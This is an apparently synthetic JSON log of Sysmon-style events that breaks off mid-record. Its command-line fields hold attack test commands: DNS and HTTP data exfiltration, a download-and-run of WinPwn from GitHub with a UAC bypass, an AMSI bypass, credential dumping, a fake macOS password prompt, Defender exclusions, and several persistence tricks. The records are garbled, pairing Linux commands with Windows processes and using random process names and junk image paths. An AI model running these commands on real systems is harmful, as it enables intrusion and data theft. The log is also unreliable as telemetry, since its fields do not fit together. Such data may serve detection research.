    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "web-36.lane.biz",
        "User": "lisaalvarez",
        "ProcessID": 4577,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"$dnsServer = \\\"#{dns_server}\\\"\\n$exfiltratedData = \\\"#{exfiltrated_data}\\\"\\n$chunkSize = #{chunk_size}\\n\\n$encodedData = [System.Text.Encoding]::UTF8.GetBytes($exfiltratedData)\\n$encodedData = [Convert]::ToBase64String($encodedData)\\n$chunks = $encodedData -split \\\"(.{$chunkSize})\\\"\\n\\nforeach ($chunk in $chunks) {\\n    $dnsQuery = $chunk + \\\".\\\" + $dnsServer\\n    Resolve-DnsName -Name $dnsQuery\\n    Start-Sleep -Seconds 5\\n}\\n\",",
        "LogonID": 589938,
        "LogonGuid": "e9e0e6c8-0c65-4fb3-bf42-dea59d3a4876",
        "SourceProcessID": 1473,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Program Files\\majority..dll",
        "DestinationProcessID": 2027,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Users\\Public\\PM..dll",
        "UtcTime": "2024-05-17T01:36:51.580802Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "email-01.burns.com",
        "User": "williamslaura",
        "ProcessID": 6076,
        "ProcessName": "nc.exe",
        "CommandLine": "\"sc sdset VSS D:(D;;GA;;;NU)(D;;GA;;;WD)(D;;GA;;;AN)S:(AU;FA;GA;;;WD)(AU;OIIOFA;GA;;;WD)\\n\",",
        "LogonID": 972533,
        "LogonGuid": "412654ef-db6c-422c-a163-d5e4cb4778fa",
        "SourceProcessID": 2839,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Windows\\forget..dll",
        "DestinationProcessID": 4591,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Users\\Public\\contain..exe",
        "UtcTime": "2024-05-17T01:36:51.580802Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "lt-24.hicks.biz",
        "User": "veronica29",
        "ProcessID": 2186,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"echo var url = \\\"#{file_url}\\\", fso = WScript.CreateObject('Scripting.FileSystemObject'), request, stream; request = WScript.CreateObject('MSXML2.ServerXMLHTTP'); request.open('GET', url, false); request.send(); if (request.status === 200) {stream = WScript.CreateObject('ADODB.Stream'); stream.Open(); stream.Type = 1; stream.Write(request.responseBody); stream.Position = 0; stream.SaveToFile(filename, 1); stream.Close();} else {WScript.Quit(1);}WScript.Quit(0); > #{script_file}\\ncscript //E:Jscript #{script_file}\\n\",",
        "LogonID": 633122,
        "LogonGuid": "a8e318d4-3780-430f-98cf-fcb724b271e5",
        "SourceProcessID": 7276,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Windows\\wish..exe",
        "DestinationProcessID": 7558,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Windows\\recognize..exe",
        "UtcTime": "2024-05-17T01:36:51.580802Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "lt-89.jordan.biz",
        "User": "kevinreed",
        "ProcessID": 5565,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"if [ $USER == \\\"root\\\" ]; then $which_ccencrypt #{root_input_file_path}; file #{root_input_file_path}.cpt; #{impact_command}; else $which_ccencrypt #{user_input_file_path}; file #{user_input_file_path}.cpt; #{impact_command}; fi\\n\",",
        "LogonID": 965303,
        "LogonGuid": "333b0553-a157-4005-bc68-a29c4395dc48",
        "SourceProcessID": 6534,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Program Files\\major..dll",
        "DestinationProcessID": 1704,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Program Files\\then..exe",
        "UtcTime": "2024-05-17T01:36:51.581796Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "email-18.hammond.com",
        "User": "oharrison",
        "ProcessID": 4406,
        "ProcessName": "malware.exe",
        "CommandLine": "\"Start-Process \\\"#{exe_binary}\\\"\\nStart-Sleep -Seconds 7\\nGet-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force\",",
        "LogonID": 772752,
        "LogonGuid": "007270f1-c64c-4c7d-a6ca-10e21112d77b",
        "SourceProcessID": 5936,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Windows\\next..exe",
        "DestinationProcessID": 5386,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Windows\\their..dll",
        "UtcTime": "2024-05-17T01:36:51.581938Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "db-97.gardner-zavala.biz",
        "User": "christopher22",
        "ProcessID": 8927,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"dsquery * -filter \\\"(objectClass=trustedDomain)\\\" -attr *\\n\",",
        "LogonID": 740327,
        "LogonGuid": "f8d9fdc1-e423-4261-8fad-98b941cb02d4",
        "SourceProcessID": 4210,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Windows\\yeah..dll",
        "DestinationProcessID": 6326,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Program Files\\school..exe",
        "UtcTime": "2024-05-17T01:36:51.581938Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "laptop-69.nichols-carlson.com",
        "User": "yhawkins",
        "ProcessID": 1183,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"sudo cp \\\"#{plist}\\\" /etc/emond.d/rules/T1546.014_emond.plist\\nsudo touch /private/var/db/emondClients/T1546.014\\n\",",
        "LogonID": 828264,
        "LogonGuid": "7b84f94d-aa48-4fe9-a9e9-e40badf85a68",
        "SourceProcessID": 5512,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Program Files\\course..exe",
        "DestinationProcessID": 6083,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Program Files\\charge..exe",
        "UtcTime": "2024-05-17T01:36:51.582445Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "laptop-01.johnston.com",
        "User": "coxjacob",
        "ProcessID": 3021,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"New-ItemProperty \\\"HKLM:\\\\Software\\\\Policies\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\" -Name AutoAdminLogon -PropertyType DWord -Value 1 -Force\\nNew-ItemProperty \\\"HKLM:\\\\Software\\\\Policies\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\" -Name DefaultUserName -Value Administrator -Force\\nNew-ItemProperty \\\"HKLM:\\\\Software\\\\Policies\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\" -Name DefaultDomainName -Value contoso.com -Force\\nNew-ItemProperty \\\"HKLM:\\\\Software\\\\Policies\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\" -Name DefaultPassword  -Value password1 -Force\\n\",",
        "LogonID": 504323,
        "LogonGuid": "f61f447d-da3b-451b-9017-82300164a721",
        "SourceProcessID": 7794,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Users\\Public\\organization..exe",
        "DestinationProcessID": 7375,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Users\\Public\\fund..exe",
        "UtcTime": "2024-05-17T01:36:51.582445Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "desktop-37.simmons-cook.info",
        "User": "pruittann",
        "ProcessID": 3948,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"reg add \\\"HKLM\\\\Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Accessibility\\\\ATs\\\\malware_test\\\"\\nreg add \\\"HKLM\\\\Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Accessibility\\\\ATs\\\\malware_test\\\" /v TerminateOnDesktopSwitch /t REG_DWORD /d 0\\nreg add \\\"HKLM\\\\Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Accessibility\\\\ATs\\\\malware_test\\\" /v StartEXE /t REG_SZ /d C:\\\\WINDOWS\\\\system32\\\\cmd.exe\\natbroker /start malware_test\\n\",",
        "LogonID": 193158,
        "LogonGuid": "37d751e0-3f4f-4e1e-ab45-a26fb256a13f",
        "SourceProcessID": 1690,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Program Files\\sit..exe",
        "DestinationProcessID": 8391,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Windows\\hit..exe",
        "UtcTime": "2024-05-17T01:36:51.582445Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "lt-77.fuller-stout.net",
        "User": "jhill",
        "ProcessID": 7921,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"wscript.exe C:\\\\Windows\\\\System32\\\\gatherNetworkInfo.vbs\\n\",",
        "LogonID": 774112,
        "LogonGuid": "79647ac4-d7b5-4e6c-8729-6aa94de302c9",
        "SourceProcessID": 9051,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Users\\Public\\investment..exe",
        "DestinationProcessID": 3670,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Windows\\production..exe",
        "UtcTime": "2024-05-17T01:36:51.583453Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "email-83.sullivan.com",
        "User": "sherrywilson",
        "ProcessID": 6445,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"systemd-run --unit=Atomic-Red-Team --on-calendar '*:0/1' /bin/sh -c 'echo \\\"$(date) $(whoami)\\\" >>/tmp/log'\\n\",",
        "LogonID": 423689,
        "LogonGuid": "acecb5ac-2df8-4678-a574-3021f8ccffcc",
        "SourceProcessID": 9136,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Users\\Public\\but..exe",
        "DestinationProcessID": 7646,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Windows\\president..exe",
        "UtcTime": "2024-05-17T01:36:51.583453Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "db-33.williams.net",
        "User": "josephthomas",
        "ProcessID": 1954,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"cmstp.exe /s \\\"#{inf_file_uac}\\\" /au\\n\",",
        "LogonID": 375829,
        "LogonGuid": "6c6aeb89-b3f2-4c8e-8f26-cfb816f27d63",
        "SourceProcessID": 9377,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Windows\\participant..dll",
        "DestinationProcessID": 4774,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Windows\\special..exe",
        "UtcTime": "2024-05-17T01:36:51.583453Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "web-72.sullivan-lucas.com",
        "User": "maciasamy",
        "ProcessID": 1392,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"pw useradd art -g wheel -s /bin/sh\\necho $(openssl passwd -1 art) | pw mod user testuser1 -h 0\\npw lock art\\npw usermod art -e +1d\\npw unlock art\\npw user mod art -e +99d\\nsu art\\nwhoami\\nexit\\n\",",
        "LogonID": 881748,
        "LogonGuid": "dd5a82a4-7f2a-411e-92c8-f958df86173b",
        "SourceProcessID": 1086,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Program Files\\far..exe",
        "DestinationProcessID": 6675,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Program Files\\role..dll",
        "UtcTime": "2024-05-17T01:36:51.583453Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "web-37.murillo.com",
        "User": "rebecca94",
        "ProcessID": 4429,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"rundll32.exe \\\"#{input_file}\\\",#2\\n\",",
        "LogonID": 801908,
        "LogonGuid": "6544c78c-9a6c-4401-bd25-606686dae543",
        "SourceProcessID": 6441,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Program Files\\consider..dll",
        "DestinationProcessID": 9172,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Program Files\\no..exe",
        "UtcTime": "2024-05-17T01:36:51.584454Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "lt-45.christian.com",
        "User": "rcarter",
        "ProcessID": 8961,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"chmod +x #{linenum}\\nbash #{linenum}\\n\",",
        "LogonID": 964057,
        "LogonGuid": "cdfb4d25-0abf-4cb5-9838-3e256dc56120",
        "SourceProcessID": 6072,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Windows\\power..exe",
        "DestinationProcessID": 3343,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Program Files\\west..dll",
        "UtcTime": "2024-05-17T01:36:51.584454Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "desktop-90.johnson-luna.com",
        "User": "qmiller",
        "ProcessID": 3652,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"where /R C:\\\\Users\\\\ places.sqlite\\n\",",
        "LogonID": 234658,
        "LogonGuid": "ba1f80cc-6313-47b9-96cc-da7b6cfe638f",
        "SourceProcessID": 8970,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Users\\Public\\young..dll",
        "DestinationProcessID": 3604,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Windows\\herself..exe",
        "UtcTime": "2024-05-17T01:36:51.584454Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "laptop-92.adams.com",
        "User": "valexander",
        "ProcessID": 6420,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"$oldvalue = $(Get-ItemProperty HKLM:\\\\System\\\\CurrentControlSet\\\\Control\\\\Lsa\\\\OSConfig -Name 'Security Packages' | Select-Object -ExpandProperty 'Security Packages');\\nSet-ItemProperty -Path \\\"HKLM:\\\\System\\\\CurrentControlSet\\\\Control\\\\Lsa\\\\OSConfig\\\" -Name 'Security Packages old' -Value \\\"$oldvalue\\\";\\n$newvalue = \\\"AtomicTest.dll\\\";\\nSet-ItemProperty HKLM:\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Lsa\\\\OSConfig -Name 'Security Packages' -Value $newvalue\\n\",",
        "LogonID": 980015,
        "LogonGuid": "725c9827-3eea-44d2-90d4-538969360bcc",
        "SourceProcessID": 2564,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Windows\\surface..exe",
        "DestinationProcessID": 6573,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Users\\Public\\may..exe",
        "UtcTime": "2024-05-17T01:36:51.584454Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "laptop-52.gomez.com",
        "User": "jamesstokes",
        "ProcessID": 1380,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"wmic useraccount get /ALL /format:csv\\n\",",
        "LogonID": 864972,
        "LogonGuid": "780bafc2-831d-4bf4-a7ed-a4940f1cdf53",
        "SourceProcessID": 4334,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Program Files\\also..exe",
        "DestinationProcessID": 9574,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Windows\\everyone..exe",
        "UtcTime": "2024-05-17T01:36:51.584454Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "db-45.nelson.com",
        "User": "tanyaowens",
        "ProcessID": 4665,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"ufw logging off\\n\",",
        "LogonID": 443496,
        "LogonGuid": "985deca3-cdb1-4d9c-96a8-87f731eaca9f",
        "SourceProcessID": 1302,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Users\\Public\\late..exe",
        "DestinationProcessID": 8000,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Windows\\magazine..exe",
        "UtcTime": "2024-05-17T01:36:51.585451Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "web-15.burgess.org",
        "User": "monica17",
        "ProcessID": 3873,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"sudo touch /Library/StartupItems/EvilStartup.plist\\n\",",
        "LogonID": 243490,
        "LogonGuid": "33da3def-c65a-4adc-bd9e-66599ab732f5",
        "SourceProcessID": 8496,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Users\\Public\\bag..dll",
        "DestinationProcessID": 9296,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Windows\\sign..dll",
        "UtcTime": "2024-05-17T01:36:51.585451Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "email-62.mcguire.com",
        "User": "stephenadkins",
        "ProcessID": 7034,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"Start-Process \\\"#{exe_binary}\\\"\\nStart-Sleep -Seconds 7\\nif (Test-Path \\\"C:\\\\Users\\\\Default\\\\AppData\\\\Local\\\\Temp\\\\hello.log\\\") { Remove-Item \\\"C:\\\\Users\\\\Default\\\\AppData\\\\Local\\\\Temp\\\\hello.log\\\" -Force; Write-Host \\\"[+] hello.log removed.\\\" }\\n\",",
        "LogonID": 173336,
        "LogonGuid": "a418d97b-6890-4d98-bd78-1dde54be1473",
        "SourceProcessID": 4881,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Users\\Public\\seek..dll",
        "DestinationProcessID": 4204,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Windows\\go..exe",
        "UtcTime": "2024-05-17T01:36:51.585451Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "web-27.watkins.com",
        "User": "connie36",
        "ProcessID": 5307,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"copy %windir%\\\\System32\\\\windowspowershell\\\\v1.0\\\\powershell.exe %APPDATA%\\\\taskhostw.exe /Y\\ncmd.exe /K %APPDATA%\\\\taskhostw.exe\\n\",",
        "LogonID": 879912,
        "LogonGuid": "0371cbf1-bf18-4380-9814-477d5ab7032d",
        "SourceProcessID": 2112,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Users\\Public\\certainly..exe",
        "DestinationProcessID": 9603,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Program Files\\still..exe",
        "UtcTime": "2024-05-17T01:36:51.585451Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "desktop-96.adams.com",
        "User": "erin93",
        "ProcessID": 8728,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"$excludedpath= \\\"#{excluded_folder}\\\"\\nAdd-MpPreference -ExclusionPath $excludedpath\",",
        "LogonID": 246426,
        "LogonGuid": "59037d75-8808-4757-a083-19fd21894175",
        "SourceProcessID": 1545,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Users\\Public\\necessary..dll",
        "DestinationProcessID": 6445,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Windows\\condition..exe",
        "UtcTime": "2024-05-17T01:36:51.585451Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "lt-46.ball.com",
        "User": "msmith",
        "ProcessID": 6325,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"#{exe_path} & ps\\nTMP=`ps | grep totally_legit`\\nif [ -z \\\"${TMP}\\\" ] ; then echo \\\"renamed process NOT FOUND in process list\\\" && exit 1; fi\\nexit 0\\n\",",
        "LogonID": 176869,
        "LogonGuid": "8b05f69e-645d-4d82-842e-c2a6b5c193d9",
        "SourceProcessID": 9967,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Windows\\eye..dll",
        "DestinationProcessID": 4606,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Users\\Public\\everything..dll",
        "UtcTime": "2024-05-17T01:36:51.586454Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "srv-20.may.com",
        "User": "walleric",
        "ProcessID": 1362,
        "ProcessName": "nc.exe",
        "CommandLine": "\"\\\"PathToAtomicsFolder\\\\..\\\\ExternalPayloads\\\\AdFind.exe\\\" -f (objectcategory=group) #{optional_args}\\n\",",
        "LogonID": 793459,
        "LogonGuid": "780f97d2-5b8e-41d5-8516-101ca3fa60da",
        "SourceProcessID": 7184,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Users\\Public\\once..dll",
        "DestinationProcessID": 3454,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Windows\\need..exe",
        "UtcTime": "2024-05-17T01:36:51.586454Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "lt-02.allen-hale.com",
        "User": "rodriguezlisa",
        "ProcessID": 6452,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"PWD_SPOOF=$(osascript -e 'display dialog \\\"To perform a security update MacOS needs your passphrase.\\\" with title \\\"MacOS Security Update\\\" default answer \\\"\\\" with icon stop with hidden answer')\\necho $PWD_SPOOF\\n\",",
        "LogonID": 728383,
        "LogonGuid": "c8902672-b0ba-45c1-b543-1a8c00f8818f",
        "SourceProcessID": 9914,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Users\\Public\\get..dll",
        "DestinationProcessID": 5873,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Windows\\describe..dll",
        "UtcTime": "2024-05-17T01:36:51.586454Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "laptop-28.campbell-thomas.biz",
        "User": "susansolis",
        "ProcessID": 2382,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"$plaintext = ([system.Text.Encoding]::UTF8.getBytes(\\\"#{plaintext}\\\"))\\n$key = \\\"#{key}\\\"\\n$cyphertext =  @();\\nfor ($i = 0; $i -lt $plaintext.Count; $i++) {\\n $cyphertext += $plaintext[$i] -bxor $key[$i % $key.Length];\\n}\\n$cyphertext = [system.Text.Encoding]::UTF8.getString($cyphertext)\\n[System.Net.ServicePointManager]::Expect100Continue = $false\\nInvoke-WebRequest -Uri #{destination_url} -Method POST -Body $cyphertext -DisableKeepAlive\\n\",",
        "LogonID": 733895,
        "LogonGuid": "f392e942-bc4b-435c-90b6-476c6d587259",
        "SourceProcessID": 6486,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Windows\\piece..exe",
        "DestinationProcessID": 7267,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Program Files\\section..dll",
        "UtcTime": "2024-05-17T01:36:51.586454Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "srv-91.pearson.com",
        "User": "erikanderson",
        "ProcessID": 6861,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\\n\",",
        "LogonID": 838518,
        "LogonGuid": "5bd85191-7174-44bf-a57a-b81c47e9c33b",
        "SourceProcessID": 3693,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Program Files\\tonight..exe",
        "DestinationProcessID": 8953,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Program Files\\subject..dll",
        "UtcTime": "2024-05-17T01:36:51.587454Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "email-85.rowland.com",
        "User": "lopezronald",
        "ProcessID": 2449,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"$xml = [System.IO.File]::ReadAllText(\\\"#{xml_path}\\\")\\nInvoke-CimMethod -ClassName PS_ScheduledTask -NameSpace \\\"Root\\\\Microsoft\\\\Windows\\\\TaskScheduler\\\" -MethodName \\\"RegisterByXml\\\" -Arguments @{ Force = $true; Xml =$xml; }\\n\",",
        "LogonID": 237842,
        "LogonGuid": "b46680b3-7d97-497f-be56-523bfb722ae3",
        "SourceProcessID": 9264,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Windows\\indicate..dll",
        "DestinationProcessID": 3249,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Windows\\hour..exe",
        "UtcTime": "2024-05-17T01:36:51.587454Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "lt-83.smith.info",
        "User": "margaret75",
        "ProcessID": 5803,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"New-ItemProperty -Path \\\"HKLM:\\\\Software\\\\Microsoft\\\\Command Processor\\\" -Name \\\"AutoRun\\\" -Value \\\"#{command}\\\" -PropertyType \\\"String\\\"\",",
        "LogonID": 295737,
        "LogonGuid": "177cfed2-1a21-41bf-9497-0978dd8df07e",
        "SourceProcessID": 3122,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Windows\\production..exe",
        "DestinationProcessID": 8919,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Windows\\much..exe",
        "UtcTime": "2024-05-17T01:36:51.587454Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "web-56.rodriguez.info",
        "User": "michele23",
        "ProcessID": 3670,
        "ProcessName": "malware.exe",
        "CommandLine": "\"PathToAtomicsFolder\\\\..\\\\ExternalPayloads\\\\nanodump.x64.exe -w \\\"%temp%\\\\nanodump.dmp\\\"\\n\",",
        "LogonID": 642239,
        "LogonGuid": "3fdfada8-27b3-485e-a933-1f547ca3aa7b",
        "SourceProcessID": 4250,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Users\\Public\\property..exe",
        "DestinationProcessID": 6892,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Program Files\\chance..dll",
        "UtcTime": "2024-05-17T01:36:51.587454Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "web-89.arnold.com",
        "User": "patricia99",
        "ProcessID": 1577,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\\nUACBypass -noninteractive -command \\\"C:\\\\windows\\\\system32\\\\cmd.exe\\\" -technique magic\",",
        "LogonID": 148470,
        "LogonGuid": "b9862982-d78e-469b-8a7a-8b997fec196e",
        "SourceProcessID": 5789,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Program Files\\push..exe",
        "DestinationProcessID": 9832,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Program Files\\sea..dll",
        "UtcTime": "2024-05-17T01:36:51.588452Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "desktop-27.arnold-nash.org",
        "User": "davidbailey",
        "ProcessID": 6104,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"mkdir -p /var/spool/mail/copy\\nfor file in /var/spool/mail/*; do\\n  if [ \\\"$(basename \\\"$file\\\")\\\" != \\\"copy\\\" ]\\n  then\\n    cp -R \\\"$file\\\" /var/spool/mail/copy/\\n  fi\\ndone\\nrm -rf /var/spool/mail/copy/*\\n\",",
        "LogonID": 731481,
        "LogonGuid": "64f4fb9e-d28e-4838-9f39-661395e4315b",
        "SourceProcessID": 7384,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Program Files\\argue..dll",
        "DestinationProcessID": 1271,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Users\\Public\\purpose..dll",
        "UtcTime": "2024-05-17T01:36:51.588452Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "lt-28.grant.info",
        "User": "tyler72",
        "ProcessID": 8739,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"bitsadmin.exe /transfer /Download /priority Foreground #{remote_file} #{local_file}\\n\",",
        "LogonID": 786553,
        "LogonGuid": "f5242b1e-1bb2-4711-a5c2-c9bc4be129ef",
        "SourceProcessID": 1148,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Users\\Public\\give..dll",
        "DestinationProcessID": 9937,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Users\\Public\\real..dll",
        "UtcTime": "2024-05-17T01:36:51.588452Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "db-06.butler.com",
        "User": "fgardner",
        "ProcessID": 6968,
        "ProcessName": "malware.exe",
        "CommandLine": "\"for %i in (C$ IPC$ ADMIN$) do net share %i /delete\",",
        "LogonID": 621853,
        "LogonGuid": "00136989-46e4-4d09-93d5-cda4c4f02c96",
        "SourceProcessID": 5532,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Windows\\huge..exe",
        "DestinationProcessID": 5783,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Windows\\century..dll",
        "UtcTime": "2024-05-17T01:36:51.588452Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "laptop-33.gutierrez.biz",
        "User": "pmccoy",
        "ProcessID": 4319,
        "ProcessName": "malware.exe",
